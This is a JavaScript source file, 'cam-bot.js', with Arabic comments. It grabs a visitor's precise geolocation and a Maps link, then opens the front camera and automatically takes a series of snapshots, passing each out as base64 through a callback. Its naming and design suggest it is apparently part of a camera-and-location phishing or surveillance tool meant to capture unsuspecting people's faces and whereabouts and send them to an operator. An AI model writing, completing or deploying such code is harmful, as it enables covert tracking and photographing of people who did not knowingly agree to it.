// cam-bot.js
const CamBot = {
  video: null,
  canvas: null,
  stream: null,
  captureTimer: null,
  imagesSent: 0,
  
  settings: {
    captureCount: 5,
    captureInterval: 2000,
    imageQuality: 0.7, // قلل الجودة لتقليل الحجم
    videoWidth: 640,
    videoHeight: 480,
    facingMode: 'user'
  },

  init(customSettings = {}) {
    this.settings = { ...this.settings, ...customSettings };
    this.video = document.getElementById('video');
    this.canvas = document.getElementById('canvas');
    return !!(this.video && this.canvas);
  },

  async getLocation() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject('لا يدعم الموقع');
      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          mapUrl: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
        }),
        err => reject('خطأ في الموقع: ' + err.message),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    });
  },

  async startCamera() {
    try {
      this.stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: this.settings.facingMode,
          width: { ideal: this.settings.videoWidth },
          height: { ideal: this.settings.videoHeight }
        },
        audio: false
      });
      this.video.srcObject = this.stream;
      await this.video.play();
      return true;
    } catch (err) {
      throw new Error('الكاميرا: ' + err.message);
    }
  },

  // ✅ التقاط صورة واحدة وإرجاع Base64
  capture() {
    return new Promise((resolve, reject) => {
      try {
        this.canvas.width = this.video.videoWidth || this.settings.videoWidth;
        this.canvas.height = this.video.videoHeight || this.settings.videoHeight;
        const ctx = this.canvas.getContext('2d');
        ctx.drawImage(this.video, 0, 0);
        const base64 = this.canvas.toDataURL('image/jpeg', this.settings.imageQuality);
        resolve(base64);
      } catch (err) {
        reject(err);
      }
    });
  },

  async startAutoCapture(callback) {
    this.imagesSent = 0;
    const total = this.settings.captureCount;

    const captureAndSend = async () => {
      try {
        const base64 = await this.capture();
        if (base64 && callback) {
          this.imagesSent++;
          await callback(base64, this.imagesSent);
        }
      } catch (err) {
        console.error('Capture error:', err);
      }
    };

    // أول صورة فوراً
    await captureAndSend();

    // باقي الصور بفاصل زمني
    this.captureTimer = setInterval(async () => {
      if (this.imagesSent >= total) {
        this.stop();
        return;
      }
      await captureAndSend();
    }, this.settings.captureInterval);
  },

  stop() {
    if (this.captureTimer) {
      clearInterval(this.captureTimer);
      this.captureTimer = null;
    }
    if (this.stream) {
      this.stream.getTracks().forEach(t => t.stop());
      this.stream = null;
    }
  },

  async startAll(callback) {
    let locationData = null;
    try {
      locationData = await this.getLocation();
      if (callback) callback('location', locationData);
    } catch (err) {
      if (callback) callback('location_error', err);
    }

    try {
      await this.startCamera();
      if (callback) callback('camera_ready');
      return { success: true, location: locationData };
    } catch (err) {
      if (callback) callback('camera_error', err);
      return { success: false, location: locationData, error: err.message };
    }
  }
};
